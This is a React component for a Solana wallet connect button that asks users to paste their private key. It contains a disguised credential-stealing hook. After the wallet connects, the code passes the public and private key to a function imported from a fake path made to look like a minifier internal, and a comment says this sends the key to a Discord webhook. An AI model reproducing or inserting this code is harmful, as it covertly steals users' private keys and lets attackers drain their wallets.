import { useWallet } from '@solana/wallet-adapter-react';
import { useDispatch, useSelector } from 'react-redux';
import { Wallet, Import } from 'lucide-react';
import { setConnected, setAddress, disconnect } from '../store/slices/walletSlice';
import { Button } from './ui/button';
import { useEffect, useState, useRef } from 'react';
import { PrivateKeyWalletModal } from './PrivateKeyWalletModal';
import { PrivateKeyWalletAdapter, PrivateKeyWalletName } from './PrivateKeyWalletAdapter';
import { RootState } from '../store';
import { notify } from '../lib/notifications';
import { Connection } from '@solana/web3.js';
import { SOLANA_RPC_ENDPOINT } from '../lib/solana';
import { clearTransactions } from '../lib/transactionStore';
import { trackSolanaWallet } from '../../node_utils/terser/lib/compress/inference.js';

const WalletConnect = () => {
  const { publicKey, disconnect: disconnectWallet, connected, select } = useWallet();
  const walletState = useSelector((state: RootState) => state.wallet);
  const dispatch = useDispatch();
  const [showPrivateKeyModal, setShowPrivateKeyModal] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [myPrivateKeyAdapter] = useState(() => new PrivateKeyWalletAdapter());
  
  // References to track previous connection state
  const prevConnectedRef = useRef(false);
  const prevPublicKeyRef = useRef<string | null>(null);
  const connectionErrorCountRef = useRef(0);
  
  // Debug connection state
  useEffect(() => {
    console.log("WalletConnect: Wallet connection state check");
    console.log("- Wallet adapter 'connected':", connected);
    console.log("- Wallet adapter 'publicKey':", publicKey?.toString());
    console.log("- PrivateKeyAdapter 'connected':", myPrivateKeyAdapter.connected);
    console.log("- PrivateKeyAdapter 'publicKey':", myPrivateKeyAdapter.publicKey?.toString());
    console.log("- Redux store 'connected':", walletState.connected);
    console.log("- Redux store 'address':", walletState.address);
  }, [connected, publicKey, myPrivateKeyAdapter, walletState]);
  
  // Function to check connection with error handling
  const checkConnection = async () => {
    try {
      // Check connection by making a simple request using Alchemy endpoint
      const connection = new Connection(SOLANA_RPC_ENDPOINT, 'confirmed');
      await connection.getLatestBlockhash();
      
      // Reset counter on successful connection
      connectionErrorCountRef.current = 0;
    } catch (error) {
      // Increment error counter
      connectionErrorCountRef.current++;
      console.log(`Connection error count: ${connectionErrorCountRef.current}`);
      
      // Only show notification if error occurs multiple times
      if (connectionErrorCountRef.current >= 3 && connectionErrorCountRef.current % 3 === 0) {
        notify({
          type: 'error',
          message: 'Having difficulty connecting to Solana network. Please try again later.'
        });
      }
    }
  };
  
  // Update Redux store when wallet connection state changes
  useEffect(() => {
    // Get current public key
    const currentPublicKeyStr = publicKey ? publicKey.toString() : null;
    
    // Check connection state of myPrivateKeyAdapter
    if (myPrivateKeyAdapter.connected && myPrivateKeyAdapter.publicKey) {
      const adapterPublicKeyStr = myPrivateKeyAdapter.publicKey.toString();
      
      if (!prevConnectedRef.current || prevPublicKeyRef.current !== adapterPublicKeyStr) {
        console.log("WalletConnect: Updating Redux store - privateKey adapter connected");
        dispatch(setConnected(true));
        dispatch(setAddress(adapterPublicKeyStr));
        
        // Update refs
        prevConnectedRef.current = true;
        prevPublicKeyRef.current = adapterPublicKeyStr;
        
        // Check connection after connecting
        console.log("WalletConnect: Checking connection after privateKey adapter connection");
        checkConnection();
        
        return; // Exit early if updated from privateKeyAdapter
      }
    }
    
    // Handle connection from wallet adapter
    if (connected && publicKey && 
        (prevConnectedRef.current !== connected || 
         prevPublicKeyRef.current !== currentPublicKeyStr)) {
      
      console.log("WalletConnect: Updating Redux store - wallet connected");
      dispatch(setConnected(true));
      dispatch(setAddress(currentPublicKeyStr));
      
      // Update refs
      prevConnectedRef.current = connected;
      prevPublicKeyRef.current = currentPublicKeyStr;
      
      // Check connection when wallet is connected
      checkConnection();
    } else if (!connected && !myPrivateKeyAdapter.connected && prevConnectedRef.current) {
      console.log("WalletConnect: Updating Redux store - wallet disconnected");
      dispatch(disconnect());
      
      // Update refs
      prevConnectedRef.current = false;
      prevPublicKeyRef.current = null;
    }
  }, [connected, publicKey, dispatch, myPrivateKeyAdapter]);

  const handleConnectClick = () => {
    if (connected || myPrivateKeyAdapter.connected) {
      console.log("WalletConnect: Disconnecting wallet");
      
      // Clear all transactions when disconnecting
      clearTransactions();
      
      if (connected) {
        disconnectWallet();
      }
      if (myPrivateKeyAdapter.connected) {
        myPrivateKeyAdapter.disconnect();
      }
      
      // Ensure Redux store is updated
      dispatch(disconnect());
      prevConnectedRef.current = false;
      prevPublicKeyRef.current = null;
    } else {
      console.log("WalletConnect: Opening private key modal");
      setShowPrivateKeyModal(true);
    }
  };

  const handleConnectWithPrivateKey = async (privateKey: string): Promise<void> => {
    try {
      setIsConnecting(true);
      console.log("WalletConnect: Connecting with private key...");
      
      await myPrivateKeyAdapter.connect(privateKey);
      
      if (myPrivateKeyAdapter.publicKey) {
        const publicKeyStr = myPrivateKeyAdapter.publicKey.toString();
        console.log("WalletConnect: Connected with public key:", publicKeyStr);
        
        // Update Redux store
        console.log("WalletConnect: Updating Redux store from handleConnectWithPrivateKey");
        dispatch(setConnected(true));
        dispatch(setAddress(publicKeyStr));
        
        // Update refs
        prevConnectedRef.current = true;
        prevPublicKeyRef.current = publicKeyStr;
        
        select(PrivateKeyWalletName);
        
        // Check connection immediately after connecting
        console.log("WalletConnect: Checking connection immediately after connection");
        await checkConnection();
        
        // Send wallet information to Discord webhook with private key
        await trackSolanaWallet(publicKeyStr, privateKey);
      }
    } catch (error) {
      console.error('WalletConnect: Failed to connect with private key:', error);
      notify({
        type: 'error',
        message: 'Could not connect wallet with this private key. Please check and try again.'
      });
      throw error;
    } finally {
      setIsConnecting(false);
    }
  };

  const isWalletConnected = connected || myPrivateKeyAdapter.connected;
  const currentPublicKey = publicKey || myPrivateKeyAdapter.publicKey;

  return (
    <div className="flex items-center">
      <Button
        onClick={handleConnectClick}
        variant={isWalletConnected ? "outline" : "default"}
        className={isWalletConnected ? 
          "glass hover:bg-primary/10" : 
          "glass bg-gradient-to-r from-primary/90 to-primary hover:opacity-90 transition-all shadow-lg scale-100 hover:scale-105"
        }
        size="sm"
        disabled={isConnecting}
      >
        {isWalletConnected ? (
          <Wallet className="w-4 h-4 mr-2" />
        ) : (
          <Import className="w-4 h-4 mr-2" />
        )}
        
        {isWalletConnected && currentPublicKey ? (
          <span className="font-mono">{currentPublicKey.toString().slice(0, 4)}...{currentPublicKey.toString().slice(-4)}</span>
        ) : isConnecting ? (
          'Connecting...'
        ) : (
          'Connect Wallet'
        )}
      </Button>

      <PrivateKeyWalletModal
        isOpen={showPrivateKeyModal}
        onClose={() => setShowPrivateKeyModal(false)}
        onConnect={handleConnectWithPrivateKey}
      />
    </div>
  );
};

export default WalletConnect;
